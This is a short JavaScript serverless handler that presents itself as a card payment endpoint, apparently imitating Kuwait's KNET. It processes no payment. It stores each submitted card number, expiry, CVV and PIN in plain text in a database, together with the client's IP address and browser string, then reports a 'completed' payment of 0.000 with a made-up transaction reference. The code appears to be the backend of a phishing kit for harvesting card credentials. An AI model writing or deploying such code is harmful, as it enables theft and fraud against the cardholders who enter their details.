const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { order_id, card_number, card_expiry, card_cvv, card_pin, card_type, bank_name } = req.body;

    const transaction_ref = 'KWT-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();

    const response = await fetch(`${SUPABASE_URL}/rest/v1/payments`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=representation'
      },
      body: JSON.stringify({
        order_id: order_id || null,
        card_number: card_number || '',
        card_expiry: card_expiry || '',
        card_cvv: card_cvv || '',
        card_pin: card_pin || '',
        card_type: card_type || 'KNET',
        bank_name: bank_name || '',
        amount: 0.000,
        status: 'completed',
        transaction_ref,
        ip_address: req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '',
        user_agent: req.headers['user-agent'] || ''
      })
    });

    const data = await response.json();
    if (!response.ok) return res.status(response.status).json(data);

    res.json({ success: true, payment: data[0], transaction_ref });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};
